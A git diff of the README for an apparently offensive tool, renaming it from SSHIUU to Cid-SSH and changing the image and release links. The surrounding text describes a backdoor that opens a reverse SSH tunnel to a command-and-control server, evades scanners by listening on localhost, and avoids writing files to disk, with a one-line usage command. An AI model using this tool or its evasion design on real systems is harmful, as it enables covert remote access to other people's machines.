@@ -1,5 +1,5 @@
-# SSHIUU
-![alt text](https://media1.tenor.com/images/616ff5ed375ce21b68e1809efab574db/tenor.gif?itemid=9888637)
+# Cid SSH
+![alt text](http://equestrianstatue.org/wp-content/uploads/2016/04/Spain-Burgos-El-Cid-4-525x394.jpg)
 
 This is a statically compiled tool (no dependencies needed) that can be used to create a SSH server and as SSH client. It will firstly, spin up an SSH server (listening in `localhost` and by default in port 2222), create certificates for it and finally create a reverse SSH tunnel with the C2. Due to the SSH server listens at `localhost`, automated scanners won't be able to detect it. 
 
@@ -26,7 +26,7 @@ Restart sshd:
 ```systemctl restart ssh```
 
 ### Client
-You can just use the prebuilt binaries that are in [Release](https://github.com/illera88/SSHIUU/releases/tag/v1.0). 
+You can just use the prebuilt binaries that are in [Release](https://github.com/illera88/Cid-SSH/releases/tag/v1.0). 
 
 If you want to compile from source keep reading:
 Compiling the client is somehow tricky because `libssh` (the library we use to handle SSH communications) does not support creating a SSH server using certificates from memory but they need to exist in disk. Since we are 3l373 hackers we don't want to drop any file to disk so I modified the `libssh` code. 
@@ -46,5 +46,5 @@ You can find all of them already prebuilt for Windows [here](https://github.com/
 It's very easy: 
 
 ```
-SSHIUU.exe 192.168.15.135
+Cid-SSH.exe 192.168.15.135
 ```
